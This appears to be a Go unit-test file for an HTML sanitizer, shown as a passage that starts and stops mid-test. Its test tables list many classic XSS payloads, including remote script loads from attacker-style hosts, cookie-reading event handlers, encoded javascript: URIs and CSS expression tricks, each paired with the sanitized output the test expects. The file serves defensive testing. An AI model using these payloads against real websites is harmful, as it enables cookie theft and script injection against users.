			expected: `C3c+d5Q9lyTafPLdelG1TKaLFinw1TOjyI6KkrQyHKkttfnO58WFvScl1TiRcB/iHxKahskoE2+VRLUIhctuDU4sUvQh/g9Arw0LAA4QTxuLFt01XYdigurz4FT15ox2oDGGGrRb3VGjDTXK1OWVJoLMW95EVqyMc9F+Fdej85LHE+8WesIfacjUQtTG1tzYVQTfubZq0+qxXws8QrxMLFtVE38tbeXo+Ok1/U5TUa6FjWflEfvKY3XVcl8RKkXua7fVz/Blj8Gh+dWe2cOxa0lpM75ZHyz9adQrB2Pb4571E4u2xI5un0R0MFJZBQuPDc1G5rPhyk+Hb4LRG3dS0m8IASQUOskv93z978L1+Abu9CLP6d6s5p+BzWxhMUqwQXC/CCpTywrkJ0RG`,
		},
		// Basic XSS
		{
			in:       `test<script>alert(document.cookie)</script>`,
			expected: `test`,
		},
		{
			in:       `<<<><<script src=http://fake-evil.ru/test.js>`,
			expected: `&lt;&lt;&lt;&gt;&lt;`,
		},
		{
			in:       `<script<script src=http://fake-evil.ru/test.js>>`,
			expected: `&gt;`,
		},
		{
			in:       `<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>`,
			expected: ``,
		},
		{
			in:       "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>",
			expected: ``,
		},
		{
			in:       `<BODY ONLOAD=alert('XSS')>`,
			expected: ``,
		},
		{
			in:       `<iframe src=http://ha.ckers.org/scriptlet.html <`,
			expected: ``,
		},
		{
			in:       `<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"">`,
			expected: `<input type="IMAGE">`,
		},
		{
			in:       `<a onblur="alert(secret)" href="http://www.google.com">Google</a>`,
			expected: `<a href="http://www.google.com">Google</a>`,
		},
		// IMG attacks
		{
			in:       `<img src="http://www.myspace.com/img.gif"/>`,
			expected: `<img src="http://www.myspace.com/img.gif"/>`,
		},
		{
			in:       `<img src=javascript:alert(document.cookie)>`,
			expected: ``,
		},
		{
			in:       `<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>`,
			expected: ``,
		},
		{
			in:       `<IMG SRC='&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041'>`,
			expected: ``,
		},
		{
			in:       `<IMG SRC="jav&#x0D;ascript:alert('XSS');">`,
			expected: ``,
		},
		{
			in:       `<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>`,
			expected: ``,
		},
		{
			in:       `<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>`,
			expected: ``,
		},
		{
			in:       `<IMG SRC="javascript:alert('XSS')"`,
			expected: ``,
		},
		{
			in:       `<IMG LOWSRC="javascript:alert('XSS')">`,
			expected: ``,
		},
		{
			in:       `<BGSOUND SRC="javascript:alert('XSS');">`,
			expected: ``,
		},
		// HREF attacks
		{
			in:       `<LINK REL="stylesheet" HREF="javascript:alert('XSS');">`,
			expected: ``,
		},
		{
			in:       `<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">`,
			expected: ``,
		},
		{
			in:       `<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>`,
			expected: ``,
		},
		{
			in:       `<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>`,
			expected: ``,
		},
		{
			in:       `<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS`,
			expected: `<ul><li>XSS`,
		},
		{
			in:       `<IMG SRC='vbscript:msgbox("XSS")'>`,
			expected: ``,
		},
		{
			in:       `<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">`,
			expected: ``,
		},
		{
			in:       `<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">`,
			expected: ``,
		},
		{
			in:       `<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">`,
			expected: ``,
		},
		{
			in:       `<IFRAME SRC="javascript:alert('XSS');"></IFRAME>`,
			expected: ``,
		},
		{
			in:       `<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>`,
			expected: ``,
		},
		{
			in:       `<TABLE BACKGROUND="javascript:alert('XSS')">`,
			expected: ``,
		},
		{
			in:       `<TABLE><TD BACKGROUND="javascript:alert('XSS')">`,
			expected: `<td>`,
		},
		{
			in:       `<DIV STYLE="background-image: url(javascript:alert('XSS'))">`,
			expected: `<div>`,
		},
		{
			in:       `<DIV STYLE="width: expression(alert('XSS'));">`,
			expected: `<div>`,
		},
		{
			in:       `<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">`,
			expected: ``,
		},
		{
			in:       `<STYLE>@im\\port'\\ja\\vasc\\ript:alert("XSS")';</STYLE>`,
			expected: ``,
		},
		{
			in:       `<BASE HREF="javascript:alert('XSS');//">`,
			expected: ``,
		},
		{
			in:       `<BaSe hReF="http://arbitrary.com/">`,
			expected: ``,
		},
		{
			in:       `<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>`,
			expected: ``,
		},
		{
			in:       `<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>`,
			expected: ``,
		},
		{
			in:       `<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>`,
			expected: ``,
		},
		{
			in:       `<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>`,
			expected: ``,
		},
		{
			in:       `<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>`,
			expected: ``,
		},
		{
			in:       `<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>`,
			expected: ``,
		},
		{
			in:       "<SCRIPT a=`>` SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
			expected: ``,
		},
		{
			in:       `<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>`,
			expected: ``,
		},
		{
			in:       `<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>`,
			expected: `PT SRC=&#34;http://ha.ckers.org/xss.js&#34;&gt;`,
		},
		{
			in:       `<SCRIPT SRC=http://ha.ckers.org/xss.js`,
			expected: ``,
		},
		{
			in:       `<div/style=&#92&#45&#92&#109&#111&#92&#122&#92&#45&#98&#92&#105&#92&#110&#100&#92&#105&#110&#92&#103:&#92&#117&#114&#108&#40&#47&#47&#98&#117&#115&#105&#110&#101&#115&#115&#92&#105&#92&#110&#102&#111&#46&#99&#111&#46&#117&#107&#92&#47&#108&#97&#98&#115&#92&#47&#120&#98&#108&#92&#47&#120&#98&#108&#92&#46&#120&#109&#108&#92&#35&#120&#115&#115&#41&>`,
			expected: `<div>`,
		},
		{
			in:       `<a href='aim: &c:\\windows\\system32\\calc.exe' ini='C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\pwnd.bat'>`,
			expected: ``,
		},
		{
			in:       `<!--\n<A href=\n- --><a href=javascript:alert:document.domain>test-->`,
			expected: `test--&gt;`,
		},
		{
			in:       `<a></a style="xx:expr/**/ession(document.appendChild(document.createElement('script')).src='http://h4k.in/i.js')">`,
			expected: ``,
		},
		// CSS attacks
		{
			in:       `<div style="position:absolute">`,
			expected: `<div>`,
		},
		{
			in:       `<style>b { position:absolute }</style>`,
			expected: ``,
		},
		{
			in:       `<div style="z-index:25">test</div>`,
			expected: `<div>test</div>`,
		},
		{
			in:       `<style>z-index:25</style>`,
			expected: ``,
		},
		// Strings that cause issues for tokenizers
		{
			in:       `<a - href="http://www.test.com">`,
			expected: `<a href="http://www.test.com">`,
		},
		// Comments
		{
			in:       `text <!-- comment -->`,
			expected: `text `,
		},
		{
			in:       `<div>text <!-- comment --></div>`,
			expected: `<div>text </div>`,
		},
		{
			in:       `<div>text <!--[if IE]> comment <[endif]--></div>`,
			expected: `<div>text </div>`,
		},
		{
			in:       `<div>text <!--[if IE]> <!--[if gte 6]> comment <[endif]--><[endif]--></div>`,
			expected: `<div>text &lt;[endif]--&gt;</div>`,
		},
		{
			in:       `<div>text <!--[if IE]> <!-- IE specific --> comment <[endif]--></div>`,
			expected: `<div>text  comment &lt;[endif]--&gt;</div>`,
		},
		{
			in:       `<div>text <!-- [ if lte 6 ]>\ncomment <[ endif\n]--></div>`,
			expected: `<div>text </div>`,
		},
		{
			in:       `<div>text <![if !IE]> comment <![endif]></div>`,
			expected: `<div>text  comment </div>`,
		},
		{
			in:       `<div>text <![ if !IE]> comment <![endif]></div>`,
			expected: `<div>text  comment </div>`,
		},
	}

	// These tests are run concurrently to enable the race detector to pick up
	// potential issues
	wg := sync.WaitGroup{}
	wg.Add(len(tests))
	for ii, tt := range tests {
		go func(ii int, tt test) {
			out := p.Sanitize(tt.in)
			if out != tt.expected {
				t.Errorf(
					"test %d failed;\ninput   : %s\noutput  : %s\nexpected: %s",
					ii,
					tt.in,
					out,
					tt.expected,
				)
			}
			wg.Done()
		}(ii, tt)
	}
	wg.Wait()
}

func TestXSS(t *testing.T) {

	p := UGCPolicy()

	tests := []test{
		{
			in:       `<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>`,
			expected: `XSS`,
		},
		{
			in: `<A HREF="h
tt	p://6	6.000146.0x7.147/">XSS</A>`,
			expected: `XSS`,
		},
		{
			in:       `<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>`,
			expected: `PT SRC=&#34;http://ha.ckers.org/xss.js&#34;&gt;`,
		},
		{
			in:       `<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>`,
			expected: ``,
		},
		{
			in:       "<SCRIPT a=`>` SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
			expected: ``,
		},
		{
			in:       `<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>`,
			expected: ``,
		},
		{
			in:       `<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>`,
			expected: ``,
		},
		{
			in:       `<SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>`,
			expected: ``,
		},
		{
			in:       `<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>`,
			expected: ``,
		},
		{
			in:       `<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS')`,
			expected: ` +ADw-SCRIPT+AD4-alert(&#39;XSS&#39;)`,
		},
		{
			in:       `<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">`,
			expected: ``,
		},
		{
			in: `<? echo('<SCR)';
echo('IPT>alert("XSS")</SCRIPT>'); ?>`,
			expected: `alert(&#34;XSS&#34;)&#39;); ?&gt;`,
		},
		{
			in:       `<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'"-->`,
			expected: ``,
		},
		{
			in: `<HTML><BODY>
<?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
<?import namespace="t" implementation="#default#time2">
<t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert("XSS")</SCRIPT>">
</BODY></HTML>`,
			expected: "\n\n\n&#34;&gt;\n",
		},
		{
			in: `<XML SRC="xsstest.xml" ID=I></XML>
<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>`,
			expected: `
<span></span>`,
		},
		{
			in: `<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></XML>
<SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>`,
			expected: `<i><b></b></i>
<span></span>`,
		},
		{
			in:       `<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>`,
			expected: ``,
		},
		{
			in:       `<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>`,
			expected: ``,
		},
		{
			in:       `<BASE HREF="javascript:alert('XSS');//">`,
			expected: ``,
		},
		{
			in:       `<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->`,
			expected: ``,
		},
		{
			in:       `<DIV STYLE="width: expression(alert('XSS'));">`,
			expected: `<div>`,
		},
		{
			in:       `<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">`,
			expected: `<div>`,
		},
		{
			in:       `<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">`,
			expected: `<div>`,
		},
		{
			in:       `<DIV STYLE="background-image: url(javascript:alert('XSS'))">`,
			expected: `<div>`,
		},
		{
			in:       `<TABLE><TD BACKGROUND="javascript:alert('XSS')">`,
			expected: `<table><td>`,
		},
		{
			in:       `<TABLE BACKGROUND="javascript:alert('XSS')">`,
			expected: `<table>`,
		},
		{
			in:       `<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>`,
			expected: ``,
		},
		{
			in:       `<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>`,
			expected: ``,
		},
		{
			in:       `<IFRAME SRC="javascript:alert('XSS');"></IFRAME>`,
			expected: ``,
		},
		{
			in:       `<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">`,
			expected: ``,
		},
		{
			in:       `<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">`,
			expected: ``,
		},
		{
			in:       `<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">`,
			expected: ``,
		},
		{
			in:       `<XSS STYLE="behavior: url(xss.htc);">`,
			expected: ``,
		},
		{
			in:       `<XSS STYLE="xss:expression(alert('XSS'))">`,
			expected: ``,
		},
		{
			in:       `<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>`,
			expected: ``,
		},
		{
			in:       `<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>`,
			expected: ``,
		},
		{
			in:       `<STYLE TYPE="text/javascript">alert('XSS');</STYLE>`,
			expected: ``,
		},
		{
			in:       `<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">`,
			expected: ``,
		},
		{
			in:       `<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>`,
			expected: ``,
		},
		{
			in:       `<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>`,
			expected: ``,
		},
		{
			in:       `<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">`,
			expected: ``,
		},
		{
			in:       `<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>`,
			expected: ``,
		},
		{
			in:       `<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">`,
			expected: ``,
		},
		{
			in:       `<LINK REL="stylesheet" HREF="javascript:alert('XSS');">`,
			expected: ``,
		},
		{
			in:       `<BR SIZE="&{alert('XSS')}">`,
			expected: `<br>`,
		},
		{
			in:       `<BGSOUND SRC="javascript:alert('XSS');">`,
			expected: ``,
		},
		{
			in:       `<BODY ONLOAD=alert('XSS')>`,
			expected: ``,
		},
		{
			in:       `<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>`,
			expected: `<ul><li>XSS</br>`,
		},
		{
			in:       `<IMG LOWSRC="javascript:alert('XSS')">`,
			expected: ``,
		},
		{
			in:       `<IMG DYNSRC="javascript:alert('XSS')">`,
			expected: ``,
		},
		{
			in:       `<BODY BACKGROUND="javascript:alert('XSS')">`,
			expected: ``,
		},
		{
			in:       `<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">`,
			expected: ``,
		},
		{
			in:       `</TITLE><SCRIPT>alert("XSS");</SCRIPT>`,
			expected: ``,
		},
		{
			in:       `\";alert('XSS');//`,
			expected: `\&#34;;alert(&#39;XSS&#39;);//`,
		},
		{
			in:       `<iframe src=http://ha.ckers.org/scriptlet.html <`,
			expected: ``,
		},
		{
			in:       `<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >`,
			expected: ``,
		},
		{
			in:       `<<SCRIPT>alert("XSS");//<</SCRIPT>`,
			expected: `&lt;`,
		},
		{
			in:       "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>",
			expected: ``,
		},
		{
			in:       `<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>`,
			expected: ``,
		},
		{
			in:       `<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>`,
			expected: ``,
		},
		{
			in:       `<IMG SRC=" &#14;  javascript:alert('XSS');">`,
			expected: ``,
		},
		{
			in:       `<IMG SRC="jav&#x0A;ascript:alert('XSS');">`,
			expected: ``,
		},
		{
			in:       `<IMG SRC="jav&#x09;ascript:alert('XSS');">`,
			expected: ``,
		},
		{
			in: `<IMG SRC="jav	ascript:alert('XSS');">`,
			expected: ``,
		},
		{
			in:       `<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>`,
			expected: ``,
		},
		{
			in: `<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&
#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>`,
			expected: ``,
		},
		{
			in: `<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;
&#39;&#88;&#83;&#83;&#39;&#41;>`,
			expected: ``,
		},
		{
			in:       `<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>`,
			expected: `<img src="/"></img>`,
		},
		{
			in:       `<IMG onmouseover="alert('xxs')">`,
			expected: ``,
		},
		{
			in:       `<IMG SRC= onmouseover="alert('xxs')">`,
			expected: `<img src="onmouseover=%22alert%28%27xxs%27%29%22">`,
		},
		{
			in:       `<IMG SRC=# onmouseover="alert('xxs')">`,
			expected: ``,
		},
		{
			in:       `<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>`,
			expected: ``,
		},
		{
			in:       `<IMG """><SCRIPT>alert("XSS")</SCRIPT>">`,
			expected: `&#34;&gt;`,
		},
		{
			in:       `<IMG SRC=javascript:alert("XSS")>`,
			expected: ``,
		},
		{
			in:       `<IMG SRC=JaVaScRiPt:alert('XSS')>`,
			expected: ``,
		},
		{
			in:       `<IMG SRC=javascript:alert('XSS')>`,
			expected: ``,
		},
		{
			in:       `<IMG SRC="javascript:alert('XSS');">`,
			expected: ``,
		},
		{
			in:       `<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>`,
			expected: ``,
		},
		{
			in:       `'';!--"<XSS>=&{()}`,
			expected: `&#39;&#39;;!--&#34;=&amp;{()}`,
		},
		{
			in:       `';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>`,
			expected: `&#39;;alert(String.fromCharCode(88,83,83))//&#39;;alert(String.fromCharCode(88,83,83))//&#34;;alert(String.fromCharCode(88,83,83))//&#34;;alert(String.fromCharCode(88,83,83))//--&gt;&#34;&gt;&#39;&gt;`,
		},
	}

	// These tests are run concurrently to enable the race detector to pick up
	// potential issues
	wg := sync.WaitGroup{}
	wg.Add(len(tests))
	for ii, tt := range tests {
		go func(ii int, tt test) {
			out := p.Sanitize(tt.in)
			if out != tt.expected {
				t.Errorf(
					"test %d failed;\ninput   : %s\noutput  : %s\nexpected: %s",
					ii,
					tt.in,
					out,
					tt.expected,
				)
			}
			wg.Done()
		}(ii, tt)
	}
	wg.Wait()
}

func TestIssue3(t *testing.T) {
	// https://github.com/microcosm-cc/bluemonday/issues/3

	p := UGCPolicy()
	p.AllowStyling()

	tests := []test{
		{
			in:       `Hello <span class="foo bar bash">there</span> world.`,
			expected: `Hello <span class="foo bar bash">there</span> world.`,
		},
		{
			in:       `Hello <span class="javascript:alert(123)">there</span> world.`,
			expected: `Hello <span>there</span> world.`,
		},
		{
			in:       `Hello <span class="><script src="http://hackers.org/XSS.js"></script>">there</span> world.`,
			expected: `Hello <span>&#34;&gt;there</span> world.`,
		},
		{
			in:       `Hello <span class="><script src='http://hackers.org/XSS.js'></script>">there</span> world.`,
			expected: `Hello <span>there</span> world.`,
		},
	}

	wg := sync.WaitGroup{}
	wg.Add(len(tests))
	for ii, tt := range tests {
		go func(ii int, tt test) {
			out := p.Sanitize(tt.in)
			if out != tt.expected {
				t.Errorf(
					"test %d failed;\ninput   : %s\noutput  : %s\nexpected: %s",
					ii,
					tt.in,
					out,
					tt.expected,
				)
			}
			wg.Done()
		}(ii, tt)
	}
	wg.Wait()
}

func TestIssue9(t *testing.T) {

	p := UGCPolicy()
	p.AllowAttrs("class").Matching(SpaceSeparatedTokens).OnElements("div", "span")
	p.AllowAttrs("class", "name").Matching(SpaceSeparatedTokens).OnElements("a")
	p.AllowAttrs("rel").Matching(regexp.MustCompile(`^nofollow$`)).OnElements("a")
	p.AllowAttrs("aria-hidden").Matching(regexp.MustCompile(`^true$`)).OnElements("a")
	p.AllowDataURIImages()

	tt := test{
		in:       `<h2><a name="git-diff" class="anchor" href="#git-diff" rel="nofollow" aria-hidden="true"><span class="octicon octicon-link"></span></a>git diff</h2>`,
		expected: `<h2><a name="git-diff" class="anchor" href="#git-diff" rel="nofollow" aria-hidden="true"><span class="octicon octicon-link"></span></a>git diff</h2>`,
	}
	out := p.Sanitize(tt.in)
	if out != tt.expected {
		t.Errorf(
			"test failed;\ninput   : %s\noutput  : %s\nexpected: %s",
			tt.in,
			out,
			tt.expected,
		)
	}

	tt = test{
		in:       `<h2><a name="git-diff" class="anchor" href="#git-diff" aria-hidden="true"><span class="octicon octicon-link"></span></a>git diff</h2>`,
		expected: `<h2><a name="git-diff" class="anchor" href="#git-diff" aria-hidden="true" rel="nofollow"><span class="octicon octicon-link"></span></a>git diff</h2>`,
	}
	out = p.Sanitize(tt.in)
	if out != tt.expected {
		t.Errorf(
			"test failed;\ninput   : %s\noutput  : %s\nexpected: %s",
			tt.in,
			out,
			tt.expected,
		)
	}

	p.AddTargetBlankToFullyQualifiedLinks(true)

	tt = test{
		in:       `<h2><a name="git-diff" class="anchor" href="#git-diff" aria-hidden="true"><span class="octicon octicon-link"></span></a>git diff</h2>`,
		expected: `<h2><a name="git-diff" class="anchor" href="#git-diff" aria-hidden="true" rel="nofollow"><span class="octicon octicon-link"></span></a>git diff</h2>`,
	}
	out = p.Sanitize(tt.in)
	if out != tt.expected {
		t.Errorf(
			"test failed;\ninput   : %s\noutput  : %s\nexpected: %s",
			tt.in,
			out,
			tt.expected,
		)
	}

	tt = test{
		in:       `<h2><a name="git-diff" class="anchor" href="https://github.com/shurcooL/github_flavored_markdown/blob/master/sanitize_test.go" aria-hidden="true"><span class="octicon octicon-link"></span></a>git diff</h2>`,
		expected: `<h2><a name="git-diff" class="anchor" href="https://github.com/shurcooL/github_flavored_markdown/blob/master/sanitize_test.go" aria-hidden="true" rel="nofollow noopener" target="_blank"><span class="octicon octicon-link"></span></a>git diff</h2>`,
	}
	out = p.Sanitize(tt.in)
	if out != tt.expected {
		t.Errorf(
			"test failed;\ninput   : %s\noutput  : %s\nexpected: %s",
			tt.in,
			out,
			tt.expected,
		)
	}

	tt = test{
		in:       `<h2><a name="git-diff" class="anchor" href="https://github.com/shurcooL/github_flavored_markdown/blob/master/sanitize_test.go" aria-hidden="true" target="namedwindow"><span class="octicon octicon-link"></span></a>git diff</h2>`,
		expected: `<h2><a name="git-diff" class="anchor" href="https://github.com/shurcooL/github_flavored_markdown/blob/master/sanitize_test.go" aria-hidden="true" rel="nofollow noopener" target="_blank"><span class="octicon octicon-link"></span></a>git diff</h2>`,
	}
	out = p.Sanitize(tt.in)
	if out != tt.expected {
		t.Errorf(
			"test failed;\ninput   : %s\noutput  : %s\nexpected: %s",
			tt.in,
			out,
			tt.expected,
		)
	}
}

func TestIssue18(t *testing.T) {
	p := UGCPolicy()

	p.AllowAttrs("color").OnElements("font")
	p.AllowElements("font")

	tt := test{
		in:       `<font face="Arial">No link here. <a href="http://link.com">link here</a>.</font> Should not be linked here.`,
		expected: `No link here. <a href="http://link.com" rel="nofollow">link here</a>. Should not be linked here.`,
	}
	out := p.Sanitize(tt.in)
	if out != tt.expected {
		t.Errorf(
			"test failed;\ninput   : %s\noutput  : %s\nexpected: %s",
			tt.in,
			out,
			tt.expected)
	}
}

func TestIssue23(t *testing.T) {
	p := NewPolicy()
	p.SkipElementsContent("tag1", "tag2")
	input := `<tag1>cut<tag2></tag2>harm</tag1><tag1>123</tag1><tag2>234</tag2>`
	out := p.Sanitize(input)
	expected := ""
	if out != expected {
		t.Errorf(
			"test failed;\ninput   : %s\noutput  : %s\nexpected: %s",
			input,
			out,
			expected)
	}

	p = NewPolicy()
	p.SkipElementsContent("tag")
	p.AllowElements("p")
	input = `<tag>234<p>asd</p></tag>`
	out = p.Sanitize(input)
	expected = ""
	if out != expected {
		t.Errorf(
			"test failed;\ninput   : %s\noutput  : %s\nexpected: %s",
			input,
			out,
			expected)
	}

	p = NewPolicy()
	p.SkipElementsContent("tag")
	p.AllowElements("p", "br")
	input = `<tag>234<p>as<br/>d</p></tag>`
	out = p.Sanitize(input)
	expected = ""
	if out != expected {
		t.Errorf(
			"test failed;\ninput   : %s\noutput  : %s\nexpected: %s",
			input,
			out,
			expected)
	}
}

func TestAllowNoAttrs(t *testing.T) {
	input := "<tag>test</tag>"
	outputFail := "test"
	outputOk := input

	p := NewPolicy()
	p.AllowElements("tag")

	if output := p.Sanitize(input); output != outputFail {
		t.Errorf(
			"test failed;\ninput   : %s\noutput  : %s\nexpected: %s",
			input,
			output,
			outputFail,
		)
	}

	p.AllowNoAttrs().OnElements("tag")

	if output := p.Sanitize(input); output != outputOk {
		t.Errorf(
			"test failed;\ninput   : %s\noutput  : %s\nexpected: %s",
			input,
			output,
			outputOk,
		)
	}
}

func TestSkipElementsContent(t *testing.T) {
	input := "<tag>test</tag>"
	outputFail := "test"
	outputOk := ""

	p := NewPolicy()

	if output := p.Sanitize(input); output != outputFail {
		t.Errorf(
			"test failed;\ninput   : %s\noutput  : %s\nexpected: %s",
			input,
			output,
			outputFail,
		)
	}

	p.SkipElementsContent("tag")

	if output := p.Sanitize(input); output != outputOk {
		t.Errorf(
			"test failed;\ninput   : %s\noutput  : %s\nexpected: %s",
			input,
			output,
			outputOk,
		)
	}
}

func TestTagSkipClosingTagNested(t *testing.T) {
	input := "<tag1><tag2><tag3>text</tag3></tag2></tag1>"
	outputOk := "<tag2>text</tag2>"

	p := NewPolicy()
	p.AllowElements("tag1", "tag3")
	p.AllowNoAttrs().OnElements("tag2")

	if output := p.Sanitize(input); output != outputOk {
		t.Errorf(
			"test failed;\ninput   : %s\noutput  : %s\nexpected: %s",
			input,
			output,
			outputOk,
		)
	}
}

func TestAddSpaces(t *testing.T) {
	p := UGCPolicy()
	p.AddSpaceWhenStrippingTag(true)

	tests := []test{
		{
			in:       `<foo>Hello</foo><bar>World</bar>`,
			expected: ` Hello  World `,
		},
		{
			in:       `<p>Hello</p><bar>World</bar>`,
